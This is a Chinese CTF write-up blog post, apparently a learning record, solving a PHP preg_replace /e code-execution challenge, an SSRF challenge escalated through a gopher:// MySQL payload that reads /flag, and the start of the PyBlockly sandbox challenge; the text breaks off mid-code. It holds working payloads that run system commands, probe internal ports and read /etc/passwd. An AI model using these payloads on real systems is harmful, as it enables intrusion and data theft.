@@ -1,0 +1,1634 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="其他题1, q1n9&#39;s blog">
+    <meta name="description" content="简单的RCE&amp;lt;?php
+
+if($_GET[&#39;moran&#39;] === &#39;flag&#39;){
+
+  highlight_file(__FILE__);
+
+  if(isset($_POST[&#39;task&#39;])&amp;amp;&amp;amp;isset($">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>其他题1 | q1n9&#39;s blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">q1n9&#39;s blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">q1n9&#39;s blog</div>
+        <div class="logo-desc">
+            
+            welcome to my blog
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/lingqing777/lingqing777.github.io" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/lingqing777/lingqing777.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">其他题1</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/ctf/">
+                                <span class="chip bg-color">ctf</span>
+                            </a>
+                        
+                            <a href="/tags/wp/">
+                                <span class="chip bg-color">wp</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
+                                网安
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2025-02-12
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2025-08-27
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    4.7k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    22 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h3 id="简单的RCE"><a href="#简单的RCE" class="headerlink" title="简单的RCE"></a>简单的RCE</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'moran'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+
+  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'task'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+
+​    <span class="token variable">$str1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'task'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+​    <span class="token variable">$str2</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+​    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/system|eval|assert|call|create|preg|sort|{|}|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i'</span><span class="token punctuation">,</span><span class="token variable">$str1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$str2</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">19</span> <span class="token operator">||</span> <span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/please_give_me_flag/'</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+<span class="token comment">#由下可知要执行$_POST['task']要有please_give_me_flag，而且preg_match有i的！（无大小写限制，故混写即可绕过）且某字符串正好长19（</span>
+​      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+​    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+
+​      <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/please_give_me_flag/ei"</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'task'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#在字符串 $_POST['flag'] 中查找所有与正则表达式 /please_give_me_flag/ 匹配的部分，然后将这些匹配部分替换为 $_POST['task'] 的值。因为/e,$_POST['task']被当作 PHP 代码执行.</span>
+
+​    <span class="token punctuation">}</span>
+
+  <span class="token punctuation">}</span>
+
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+
+  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"moran want a flag.&lt;/br&gt;(?moran=flag)"</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">}</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>看到<code>/e</code>知道会执行任意 PHP 代码<del>（遇到一个相同的题在第二页，所以这就不放相关了</del></p>
+<p>还有一点要记得php版本低点<del>（是谁一开始用的7.3.4我不说</del></p>
+<blockquote>
+<p>在 PHP 7.0.0 及之后的版本中，<code>preg_replace</code> 函数的 <code>/e</code> 修饰符被彻底移除。如果在这些版本中使用 <code>/e</code> 修饰符，会导致 <code>E_COMPILE_ERROR</code> 错误，代码将无法正常运行。</p>
+</blockquote>
+<p>用<code>flag=please_Give_me_flag&amp;task=phpinfo()</code>可以先测试一下（</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/3567b2ea989c79d81cbc893d58a549ce.png"></p>
+<p>可的（</p>
+<p>浅贴一篇喵<a target="_blank" rel="noopener" href="https://www.cnblogs.com/willingyut/p/17688487.html">绕过PHP正则表达式 - willingyut - 博客园</a></p>
+<pre class="line-numbers language-none"><code class="language-none">task=$_POST[1]($_POST[2]);&amp;flag=Please_give_me_flag&amp;1=system&amp;2=tac /f*   //tac 则按行逆序输出文件内容
+task=var_dump(file_get_contents(hex2bin("2f666c6167")));&amp;flag=please_Give_me_flag
+flag=please_give_me_flaG&amp;task=print(file_get_contents("\x2f\x66\x6c\x61\x67"));
+...
+scandir 函数用于列出指定目录中的文件和文件夹var_dump(scandir(chr(47)));读取根目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h3 id="EasySignin"><a href="#EasySignin" class="headerlink" title="EasySignin"></a>EasySignin</h3><p>尝试注册admin被告知用户名已存在，故想登录admin</p>
+<p>注册一个在改密码界面改一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/4edce8c385acaba3b2484943f735cdae.png"></p>
+<p><del>admin不为人知的图片竟是！</del></p>
+<p>发现<code>/getpicture.php?url=</code></p>
+<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2021/05/ssrf.html#SSRF-%E4%B9%8B-XXE">手把手带你用 SSRF 打穿内网 | 国光</a></p>
+<pre class="line-numbers language-none"><code class="language-none">?url=https://www.baidu.com/robots.txt
+
+User-agent: Baiduspider
+Disallow: /baidu
+Disallow: /s?
+Disallow: /ulink?
+Disallow: /link?
+Disallow: /home/news/data
+Disallow: /bh
+...
+
+?url=127.0.0.1
+&lt;!DOCTYPE html&gt;
+&lt;html lang="zh-CN"&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;
+...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>存在ssrf漏洞</p>
+<pre class="line-numbers language-none"><code class="language-none">?url=file:///etc/passwd
+
+&lt;img src="data:image/jpeg;base64,bm9ub25v" width="20" alt="图片"&gt;
+nonono<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><del>（被狠狠拒绝了</del></p>
+<p>探一下端口喵</p>
+<pre class="line-numbers language-none"><code class="language-none">GET /getpicture.php?url=127.0.0.1:8080 HTTP/1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>抓到一个3306</p>
+<pre class="line-numbers language-none"><code class="language-none">WP%^-g����lV;@m%	mysql_native_password��Got packets out of order<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p><code>mysql_native_password</code> 是 MySQL 数据库中用于用户认证的一种插件。在 MySQL 里，用户登录数据库时需要进行身份验证，而认证插件就是负责完成这个验证过程的机制。<code>mysql_native_password</code> 是 MySQL 5.7 及之前版本中默认的认证插件</p>
+</blockquote>
+<p>看来是默认，默认用户名是 <code>root</code></p>
+<blockquote>
+<p>MySQL：如果用户没有密码保护，您可以转储他的数据库，也可以将恶意文件放入他的系统中。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.iamwawa.cn/urldecode.html%EF%BC%88%E6%89%80%E4%BB%A5%E8%BF%99%E4%B9%88%E4%B9%85%E4%B9%8B%E5%90%8E%E8%BF%98%E6%98%AF%E7%94%A8%E7%9D%80%E6%9C%80%E5%88%9D%E7%9A%84url%E7%BC%96%E7%A0%81%E7%BD%91%E5%9D%80%E5%90%97%E3%80%82%E3%80%82%E3%80%82">https://www.iamwawa.cn/urldecode.html（所以这么久之后还是用着最初的url编码网址吗。。。</a></p>
+<p>一开始一直在查表查列，后来才想到flag是在文件夹里（</p>
+<blockquote>
+<p><code>LOAD_FILE()</code> 是 MySQL 内置的一个函数，用于读取指定路径下的文件内容并将其作为字符串返回。该函数需要有相应的文件读取权限，并且文件路径必须是绝对路径。</p>
+<p><code>load_file</code>在渗透过程中是读取文件，<code>select load_file('/flag');</code>就是读取<code>mysql</code>配置文件，<code>flag</code>又在根目录下</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Wesuiliye/p/17226511.html">mysql注入读写文件 - 0x1e61 - 博客园</a></p>
+<p><code>./gopherus.py --exploit mysql</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/f313cb49708c893f7941b9af6321bf79.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">?url=gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%251b%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%256c%256f%2561%2564%255f%2566%2569%256c%2565%2528%2527%252f%2566%256c%2561%2567%2527%2529%253b%2501%2500%2500%2500%2501 
+
+flag{c8cfb052-cc9b-4b27-a9b9-b3ad7b93627b}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>mysql那端口都是3306吗？Gopher也直接给的3306</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Magiclala/p/15993571.html">各种常用的默认端口号 总结 - Magiclala - 博客园</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0ca4d276d3c0239b63e831c0bebbd2aa.png"></p>
+<p>看来确实</p>
+<hr>
+<h3 id="2024强网杯-PyBlockly"><a href="#2024强网杯-PyBlockly" class="headerlink" title="2024强网杯-PyBlockly"></a>2024强网杯-PyBlockly</h3><p>题目附件：</p>
+<blockquote>
+<p>通过百度网盘分享的文件：PyBlockly_3c0f83fae6937f4147d3bc7ae…<br>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1yC7afEWa1Rh1VCgIMf41Iw?pwd=6666">https://pan.baidu.com/s/1yC7afEWa1Rh1VCgIMf41Iw?pwd=6666</a><br>提取码：6666<br>–来自百度网盘超级会员V2的分享</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1yC7afEWa1Rh1VCgIMf41Iw?pwd=6666">PyBlockly_3c0f83fae6937f4147d3bc7ae84ce3e2.zip_免费高速下载|百度网盘-分享无限制</a></p>
+<p>网上好心人的，感谢感谢！！！</p>
+<p><del>这下可以狠狠启动了（</del></p>
+<p><code>python app.py</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/7d714d37445706f30a25454cd4cf5046.png"></p>
+<p>哈哈，挺好玩的，<del>我能玩儿一天（</del></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify
+<span class="token keyword">import</span> re
+<span class="token keyword">import</span> unidecode
+<span class="token keyword">import</span> string
+<span class="token keyword">import</span> ast
+<span class="token keyword">import</span> sys
+<span class="token keyword">import</span> os
+<span class="token keyword">import</span> subprocess
+<span class="token keyword">import</span> importlib<span class="token punctuation">.</span>util
+<span class="token keyword">import</span> json
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'JSON_AS_ASCII'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>
+
+blacklist_pattern <span class="token operator">=</span> <span class="token string">r"[!\"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\\]^_`{|}~]"</span>
+
+<span class="token keyword">def</span> <span class="token function">module_exists</span><span class="token punctuation">(</span>module_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+
+    spec <span class="token operator">=</span> importlib<span class="token punctuation">.</span>util<span class="token punctuation">.</span>find_spec<span class="token punctuation">(</span>module_name<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> spec <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
+
+    <span class="token keyword">if</span> module_name <span class="token keyword">in</span> sys<span class="token punctuation">.</span>builtin_module_names<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">True</span>
+  
+    <span class="token keyword">if</span> spec<span class="token punctuation">.</span>origin<span class="token punctuation">:</span>
+        std_lib_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>__file__<span class="token punctuation">)</span>
+      
+        <span class="token keyword">if</span> spec<span class="token punctuation">.</span>origin<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>std_lib_path<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">not</span> spec<span class="token punctuation">.</span>origin<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token boolean">True</span>
+    <span class="token keyword">return</span> <span class="token boolean">False</span>
+
+<span class="token keyword">def</span> <span class="token function">verify_secure</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> node <span class="token keyword">in</span> ast<span class="token punctuation">.</span>walk<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">match</span> <span class="token builtin">type</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">case</span> ast<span class="token punctuation">.</span>Import<span class="token punctuation">:</span>  
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ERROR: Banned module "</span><span class="token punctuation">)</span>
+                <span class="token keyword">return</span> <span class="token boolean">False</span>
+            <span class="token keyword">case</span> ast<span class="token punctuation">.</span>ImportFrom<span class="token punctuation">:</span> 
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"ERROR: Banned module </span><span class="token interpolation"><span class="token punctuation">{</span>node<span class="token punctuation">.</span>module<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+                <span class="token keyword">return</span> <span class="token boolean">False</span>
+    <span class="token keyword">return</span> <span class="token boolean">True</span>
+
+<span class="token keyword">def</span> <span class="token function">check_for_blacklisted_symbols</span><span class="token punctuation">(</span>input_text<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>blacklist_pattern<span class="token punctuation">,</span> input_text<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">True</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
+
+
+
+<span class="token keyword">def</span> <span class="token function">block_to_python</span><span class="token punctuation">(</span>block<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    block_type <span class="token operator">=</span> block<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span>
+    code <span class="token operator">=</span> <span class="token string">''</span>
+  
+    <span class="token keyword">if</span> block_type <span class="token operator">==</span> <span class="token string">'print'</span><span class="token punctuation">:</span>
+        text_block <span class="token operator">=</span> block<span class="token punctuation">[</span><span class="token string">'inputs'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'TEXT'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'block'</span><span class="token punctuation">]</span>
+        text <span class="token operator">=</span> block_to_python<span class="token punctuation">(</span>text_block<span class="token punctuation">)</span>  <span class="token comment">#递归调用 block_to_python 函数将 text_block 转换为 Python 代码 text。</span>
+        code <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"print(</span><span class="token interpolation"><span class="token punctuation">{</span>text<span class="token punctuation">}</span></span><span class="token string">)"</span></span><span class="token comment">#使用了 Python 的 f-string 格式化字符串特性，其主要功能是生成一条 Python 的 print 函数调用语句</span>
+         
+    <span class="token keyword">elif</span> block_type <span class="token operator">==</span> <span class="token string">'math_number'</span><span class="token punctuation">:</span>
+      
